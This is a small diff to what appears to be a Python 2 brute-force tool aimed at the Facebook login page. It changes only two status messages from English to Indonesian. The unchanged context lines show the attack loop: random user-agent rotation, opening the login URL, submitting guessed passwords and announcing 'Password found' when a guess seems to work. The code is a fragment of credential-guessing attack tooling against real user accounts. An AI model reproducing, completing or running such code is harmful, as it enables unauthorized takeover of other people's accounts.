@@ -24,7 +24,7 @@ login = 'https://www.facebook.com/login.php?login_attempt=1'
 def attack(password):
 
   try:
-     sys.stdout.write("\r => trying %s.. " % password)
+     sys.stdout.write("\r => Mencoba %s " % password)
      sys.stdout.flush()
      br.addheaders = [('User-agent', random.choice(useragents))]
      site = br.open(login)
@@ -38,7 +38,7 @@ def attack(password):
      br.submit()
      log = br.geturl()
      if log == login:
-        print "\n\n\n  => Password found .. !!"
+        print "\n\n\n  => Password ditemukan .. !!"
         print "\n  [*] Password => %s\n" % (password)
         sys.exit(1)
   except KeyboardInterrupt:
